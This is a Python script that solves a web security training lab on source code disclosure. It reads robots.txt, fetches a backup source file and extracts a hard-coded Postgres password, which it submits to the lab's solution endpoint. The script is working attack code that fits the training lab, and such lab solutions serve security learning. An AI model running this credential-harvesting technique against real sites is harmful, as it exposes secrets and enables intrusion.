# Source code disclosure via backup files

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_password(s, url):
	robots_path = '/robots.txt'
	print('\n[+] Navigating to:\t%s' % robots_path)
	r = s.get(url + robots_path)
	time.sleep(1)
	print(r.text)
	backup_path = r.text.encode().split(b'\n')[1].split(b' ')[1].decode()
	print('\n[+] Navigating to:\t%s' % backup_path)
	r = s.get(url + backup_path)
	time.sleep(1)
	print(r.text)
	file_path = re.search(r"<a href='(.*)'>", r.text).group(1)
	print('\n[+] Navigating to:\t%s' % file_path)
	r = s.get(url + file_path)
	time.sleep(1)
	print(r.text)
	password = re.search(rb'\n                "postgres",\n                "postgres",\n                "(.*)"\n        \).withAutoCommit\(\);', r.text.encode()).group(1).decode()
	print('\n[+] Found Postgres password:\t%s' % password)
	time.sleep(1)
	return password

def submit_password(s, url, password):
	print('[+] Trying to submit the password to solve the lab...')
	submit_path = url + '/submitSolution'
	submit_data = {"answer": password}
	r = s.post(submit_path, data=submit_data)
	time.sleep(1)
	return r

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Source code disclosure via backup files')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to retrieve the postgres password in backup files...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			password = get_password(s, url)
			r = submit_password(s, url, password)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
